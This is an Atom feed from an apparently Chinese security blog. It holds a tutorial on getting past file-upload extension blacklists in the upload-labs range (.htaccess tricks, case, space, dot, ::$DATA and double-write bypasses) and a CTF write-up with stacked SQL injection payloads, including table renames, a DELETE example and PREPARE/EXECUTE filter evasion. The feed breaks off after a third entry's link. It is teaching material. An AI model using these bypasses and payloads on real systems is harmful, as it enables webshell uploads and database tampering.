<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Artd33</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://artd33.github.io/"/>
  <updated>2020-02-14T07:11:31.834Z</updated>
  <id>https://artd33.github.io/</id>
  
  <author>
    <name>Artd33</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传漏洞之黑名单检测绕过</title>
    <link href="https://artd33.github.io/2020/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
    <id>https://artd33.github.io/2020/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</id>
    <published>2020-02-13T19:16:22.000Z</published>
    <updated>2020-02-14T07:11:31.834Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>文件上传是一个很常见的功能，文件上传漏洞也比较普遍，原理简单，造成的危害却很大，是一个入门级别的漏洞。这篇文章主要针对文件上传漏洞中的 <strong>黑名单检测绕过</strong> 这个点，结合<strong>upload-labs</strong>，做一个较为全面的总结。</p><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h2 id="黑名单思想"><a href="#黑名单思想" class="headerlink" title="黑名单思想"></a>黑名单思想</h2><p>利用黑名单的思想来防御文件上传漏洞是一种很常见的做法，比如upload-labs的第三关<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.1/upload_bypass/debug/a.png" data-fancybox="group" data-caption class="fancybox"><img width="400" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.1/upload_bypass/debug/a.png" class="lazyload" title></a><br>但是黑名单思想很难把所有可能引发漏洞的威胁给过滤掉，而且随着时代发展还有可能有新的攻击方式产生，所以黑名单思想是一种不够安全的思想。</p><blockquote><h2 id="Secure-By-Default-原则"><a href="#Secure-By-Default-原则" class="headerlink" title="Secure By Default 原则"></a>Secure By Default 原则</h2><p>在设计安全方案时，最基本也就是最重要的原则就是“Secure by Default” 。在做任何安全设计时，都要牢牢记住这个原则。一个方案设计得是否足够安全，与有没有应用这个原则有很大的关系。实际上，“Secure by Default” 原则，也可归纳为白名单、黑名单的思想。如果更多地使用白名单，那么系统会变得更安全。<br>                                          ——《白帽子讲Web安全》</p></blockquote><h1 id="0x01-换用文件后缀（Pass-03）"><a href="#0x01-换用文件后缀（Pass-03）" class="headerlink" title="0x01 换用文件后缀（Pass-03）"></a>0x01 换用文件后缀（Pass-03）</h1><p>能被Web容器解析的文件后缀（简单来说就是能被当做php文件来执行），除了我们最常见的 <strong>.php</strong>以外还有很多，比如php1、php2、php3、php4、php5、phtml。</p><p>以 <strong>upload-labs</strong> 第3关为例：<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/2.png" class="lazyload" title></a></p><p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！可以看到这关禁用了4种文件，但是这是远远不够的……</p><p>可以看看 <strong>upload-labs</strong> 第4关，体会一下这两关的区别：</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/3.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/3.png" class="lazyload" title></a><p>所以思路就很明确了，我们先创建一个文件，取名为phpinfo.php3（php1、php2、php3、php4、php5、phtml），内容如下：</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/4.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/4.png" class="lazyload" title></a><p>把这个文件上传，然后查看图像</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/5.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/5.png" class="lazyload" title></a><p>可以看到我们上传的文件成功被当成php文件来解析，文件内容被成功执行</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/6.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/6.png" class="lazyload" title></a><p>当然，如果文件内容是一句话木马，我们就可以成功地利用工具连接、控制目标网站。操作也比较简单，这里就不演示了。</p><h1 id="0x02-htaccess文件的利用（Pass-04）"><a href="#0x02-htaccess文件的利用（Pass-04）" class="headerlink" title="0x02 .htaccess文件的利用（Pass-04）"></a>0x02 .htaccess文件的利用（Pass-04）</h1><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>htaccess文件是<strong>Apache</strong>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<strong>仅限于Apache服务器</strong></p><p><strong>简单来说</strong>，我们如果上传了 .htaccess 这样一个配置文件到了upload目录里，那么这个文件里面的一些可以人为修改的指令就可以控制upload这个目录以及子目录的一些功能。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/7.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/7.png" class="lazyload" title></a><p>第4关和第3关的相比之下禁用了更多的后缀名，真是让人头疼，这时候我们灵光一闪，想到了.htaccess文件的利用，然后我们上传一个以下内容的.htaccess文件。它的作用是 <strong>让这个文件所在的目录里的所有文件都以php来解析</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/8.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/8.png" class="lazyload" title></a><p>这时再上传一个以下内容的文件，文件名为 <strong>phpinfo.jpg</strong>，这时的文件名后缀就不用那么讲究了，因为不管是什么后缀，都会被当做php文件解析</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.1/upload_bypass/debug/b.png" data-fancybox="group" data-caption class="fancybox"><img width="400" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.1/upload_bypass/debug/b.png" class="lazyload" title></a><p>结果被成功解析执行</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/9.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/9.png" class="lazyload" title></a><h1 id="0x03-大写绕过（Pass-05）"><a href="#0x03-大写绕过（Pass-05）" class="headerlink" title="0x03 大写绕过（Pass-05）"></a>0x03 大写绕过（Pass-05）</h1><p>这关相比上一关增加了禁止 .htaccess 文件的上传</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/10.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/10.png" class="lazyload" title></a><p>但是我们还有一个简单的小思路，那就是利用其过滤的不严谨性，<strong>没有顾及到后缀的大小写检测，以及windows对大小写不敏感</strong>，从而简单的绕过</p><p>上传一个文件名为 phpinfo.PHP的文件，内容为 <strong><!--?phh phpinfo(); ?--></strong>，结果被成功执行。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/11.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/11.png" class="lazyload" title></a><h1 id="0x04-加空格绕过（Pass-06）"><a href="#0x04-加空格绕过（Pass-06）" class="headerlink" title="0x04 加空格绕过（Pass-06）"></a>0x04 加空格绕过（Pass-06）</h1><p>查看本关的源码可以看到没有对文件后缀进行去空操作</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/12.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/12.png" class="lazyload" title></a><p>所以可以利用 <strong>BurpSuite</strong> 截断 给文件名 phpinfo.php 尾部加一个空格后，将绕过服务器端的检测</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/13.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/13.png" class="lazyload" title></a><p>访问</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/14.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/14.png" class="lazyload" title></a><h1 id="0x05-加点绕过（Pass-07）"><a href="#0x05-加点绕过（Pass-07）" class="headerlink" title="0x05 加点绕过（Pass-07）"></a>0x05 加点绕过（Pass-07）</h1><p>利用 <strong>BurpSuite</strong> 截断 给文件名 phpinfo.php 尾部加一个点后，可以绕过服务器端的检测</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/15.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/15.png" class="lazyload" title></a><p>根据windows的特性，会自动去除文件尾部的点，从而让文件被web容器解析执行</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/16.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/16.png" class="lazyload" title></a><h1 id="0x06-DATA绕过（Pass-08）"><a href="#0x06-DATA绕过（Pass-08）" class="headerlink" title="0x06 ::$DATA绕过（Pass-08）"></a>0x06 ::$DATA绕过（Pass-08）</h1><p>根据ntfs文件系统的特性，可以在后缀中加::$DATA绕过</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/17.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/17.png" class="lazyload" title></a><p>查看图片发现禁止访问，原因我也说不上来。  ps：关于::$DATA绕过我还不是很懂，要是有dalao看到希望能教教我。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/18.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/18.png" class="lazyload" title></a><p>然后把URL框的::$DATA去掉就可以以php的形式解析执行了。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/19.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/19.png" class="lazyload" title></a><h1 id="0x07-点空点绕过（Pass-09）"><a href="#0x07-点空点绕过（Pass-09）" class="headerlink" title="0x07 点空点绕过（Pass-09）"></a>0x07 点空点绕过（Pass-09）</h1><p>可以看一下这一关的源码，把之前讲的绕过方式都给禁用了</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/20.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/20.png" class="lazyload" title></a><p>这时候我们给后缀加点加空再加点，去了一个点和去空之后就和前面加点绕过效果一样了</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/21.png" data-fancybox="group" data-caption class="fancybox"><img width="600" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/21.png" class="lazyload" title></a><p>文件被成功解析执行：</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/22.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/22.png" class="lazyload" title></a><h1 id="0x08-双写绕过（Pass-10）"><a href="#0x08-双写绕过（Pass-10）" class="headerlink" title="0x08 双写绕过（Pass-10）"></a>0x08 双写绕过（Pass-10）</h1><p>这关把所有和黑名单匹配的后缀名都替换为空，但是只替换一次，源码如下</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/23.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/23.png" class="lazyload" title></a><p>遇到这种情况我们可以双写后缀来上传一个php文件，比如文件名为phpinfo.pphphp即可成功上传，最后访问的是info.php文件，文件内容成功被web容器解析</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/24.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@3.0/upload_bypass/24.png" class="lazyload" title></a><h1 id="0x09-总结与心得"><a href="#0x09-总结与心得" class="headerlink" title="0x09 总结与心得"></a>0x09 总结与心得</h1><p>文件上传之黑名单检测绕过这个点就说完了，欢迎纠错、补充。当然，这只是<strong>文件上传漏洞</strong>非常小的一部分，文件上传漏洞还有很多姿势等着我去学习。一开始我用的是 <strong>buu</strong> 的 <strong>upload-labs</strong>，但是可能是环境问题（那里的php版本是7点多的，官方建议的是5.2.17），导致一些关卡也存在问题。所以推荐大家自己动手搭一个环境，下载一个集成环境，只要7.7M，非常方便 <a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;文件上传是一个很常见的功能，文件上传漏洞也比较普遍
      
    
    </summary>
    
    
    
      <category term="文件上传漏洞" scheme="https://artd33.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>[强网杯 2019]随便注WP(两种方法利用堆叠注入)</title>
    <link href="https://artd33.github.io/2020/01/11/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8WP-%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>https://artd33.github.io/2020/01/11/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8WP-%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-11T12:57:03.000Z</published>
    <updated>2020-01-24T14:50:51.199Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-堆叠注入学习-堆叠查询，Stacked-Queries"><a href="#0x01-堆叠注入学习-堆叠查询，Stacked-Queries" class="headerlink" title="0x01 堆叠注入学习(堆叠查询，Stacked Queries)"></a>0x01 堆叠注入学习(堆叠查询，Stacked Queries)</h2><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p><h5 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h5><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p><h5 id="举个堆叠注入攻击的例子"><a href="#举个堆叠注入攻击的例子" class="headerlink" title="举个堆叠注入攻击的例子"></a>举个堆叠注入攻击的例子</h5><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql> select * from users where id =1;delete from users;</span><br></pre></td></tr></tbody></table></figure></div><h5 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h5><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/123.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/123.png" class="lazyload"></a></p><h2 id="0x02-方法一：重命名-堆叠注入"><a href="#0x02-方法一：重命名-堆叠注入" class="headerlink" title="0x02 方法一：重命名+堆叠注入"></a>0x02 方法一：重命名+堆叠注入</h2><p><strong>1. 发现可以利用 or 把表中所有数据都查询出来，但是并没有我们需要的flag</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/1.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/1.png" class="lazyload"></a><p><strong>2. 先看一下库名，发现很多函数都被过滤了。由于select被过滤了，union查询也就用不上了。</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/2.png" class="lazyload"></a><p><strong>3. 尝试一下堆叠注入，果然可以，把全部库名都给查出来了</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/3.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/3.png" class="lazyload"></a><p><strong>4. OK继续查表名</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/4.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/4.png" class="lazyload"></a><p><strong>5. 查看表结构 ，可以发现flag在`1919810931114514`表里</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';desc \`1919810931114514`;<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/5.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/5.png" class="lazyload"></a><p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p><p>eg.  mysql> SELECT * FROM   `table`   WHERE  `id` = ‘123’ ;</p><p>1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关</p><p><strong>6. 再查看words表的结构，发现一共有id和data两列。</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">>0';desc words;#</span><br></pre></td></tr></tbody></table></figure></div><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/6.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/6.png" class="lazyload"></a><p><strong>那么可以猜测我们提交查询的窗口就是在这个表里查询数据的</strong></p><p><strong>7. 那么查询语句很有可能是 : selsect id,data from words where id =</strong></p><p><strong>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</strong></p><p><strong>payload</strong>:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> words1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;desc  words;<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/7.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/7.png" class="lazyload"></a><p><strong>8. 再用一下一开始的操作id=1’ or 1=1#</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/8.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/suibianzhu/8.png" class="lazyload"></a><br><h2 id="0x03-方法二：预处理语句-堆叠注入"><a href="#0x03-方法二：预处理语句-堆叠注入" class="headerlink" title="0x03 方法二：预处理语句+堆叠注入"></a>0x03 方法二：预处理语句+堆叠注入</h2><p>预处理语句使用方式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="string">'[my sql sequece]'</span>;   //预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">name</span>;  //执行预定义SQL语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> <span class="keyword">name</span>;  //删除预定义SQL        语句</span><br></pre></td></tr></tbody></table></figure></div><p>预定义语句也可以通过变量进行传递:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn = <span class="string">'hahaha'</span>;  //存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span> = <span class="keyword">concat</span>(<span class="string">'select * from '</span>, @tn);  //存储SQL语句</span><br><span class="line"><span class="keyword">PREPARE</span> <span class="keyword">name</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;   //预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">name</span>;  //执行预定义SQL语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  //删除预定义SQL语句</span><br></pre></td></tr></tbody></table></figure></div><p>本题即可利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p><p>char(115,101,108,101,99,116)<—–>’select’</p><h6 id="payload1：不使用变量"><a href="#payload1：不使用变量" class="headerlink" title="payload1：不使用变量"></a>payload1：不使用变量</h6><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">PREPARE</span> hacker <span class="keyword">from</span> <span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>), <span class="string">' * from `1919810931114514` '</span>);<span class="keyword">EXECUTE</span> hacker;<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><h6 id="payload2：使用变量"><a href="#payload2：使用变量" class="headerlink" title="payload2：使用变量"></a>payload2：使用变量</h6><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">SET</span> @sqli=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">'* from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> hacker <span class="keyword">from</span> @sqli;<span class="keyword">EXECUTE</span> hacker;<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><h6 id="payload3：只是用contact-不使用char"><a href="#payload3：只是用contact-不使用char" class="headerlink" title="payload3：只是用contact(),不使用char()"></a>payload3：只是用contact(),不使用char()</h6><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">PREPARE</span> hacker <span class="keyword">from</span> <span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect'</span>, <span class="string">' * from `1919810931114514` '</span>);<span class="keyword">EXECUTE</span> hacker;<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>直接输入这三个payload的任何一个都能获得flag</p><p>参考文章：<br><a href="https://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">https://www.sqlinjection.net/stacked-queries/</a><br><a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">https://www.jianshu.com/p/36f0772f5ce8</a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;0x01-堆叠注入学习-堆叠查询，Stacked-Queries&quot;&gt;&lt;a href=&quot;#0x01-堆叠注入学习-堆叠查询，Stacked-Queries&quot; class=&quot;headerlink&quot; title=&quot;0x0
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>[极客大挑战 2019]SQL部分 WriteUp</title>
    <link href="https://artd33.github.io/2020/01/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SQL%E9%83%A8%E5%88%86WriteUp/"/>
